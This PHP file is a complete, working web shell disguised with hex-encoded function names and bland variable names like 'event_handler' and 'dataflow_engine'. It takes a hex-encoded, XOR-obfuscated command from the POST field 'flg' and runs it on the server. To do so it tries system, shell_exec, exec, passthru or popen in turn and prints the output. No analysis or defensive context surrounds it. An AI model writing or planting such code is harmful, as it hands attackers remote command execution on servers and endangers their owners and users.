<?php

$event_handler4 = "\x70\x61\x73s\x74hru";
$event_handler1 = "\x73ys\x74\x65m";
$secure_access = "h\x65\x782b\x69\x6E";
$event_handler2 = "sh\x65\x6C\x6C\x5F\x65xec";
$event_handler7 = "\x70cl\x6F\x73e";
$event_handler6 = "\x73t\x72\x65a\x6D_ge\x74\x5Fc\x6F\x6Et\x65n\x74s";
$event_handler3 = "\x65x\x65c";
$event_handler5 = "\x70\x6Fpen";
if (isset($_POST["fl\x67"])) {
            function dataflow_engine( $obj,  $item){
 $record='';
 for($i=0;
 $i<strlen($obj);
 $i++){
$record.=chr(ord($obj[$i])^$item);

} return$record;

}
            $flg = $secure_access($_POST["fl\x67"]);
            $flg = dataflow_engine($flg, 54);
            if (function_exists($event_handler1)) {
                $event_handler1($flg);
            } elseif (function_exists($event_handler2)) {
                print $event_handler2($flg);
            } elseif (function_exists($event_handler3)) {
                $event_handler3($flg, $pgrp_obj);
                print join("\n", $pgrp_obj);
            } elseif (function_exists($event_handler4)) {
                $event_handler4($flg);
            } elseif (function_exists($event_handler5) && function_exists($event_handler6) && function_exists($event_handler7)) {
                $item_record = $event_handler5($flg, 'r');
                if ($item_record) {
                    $tkn_descriptor = $event_handler6($item_record);
                    $event_handler7($item_record);
                    print $tkn_descriptor;
                }
            }
            exit;
        }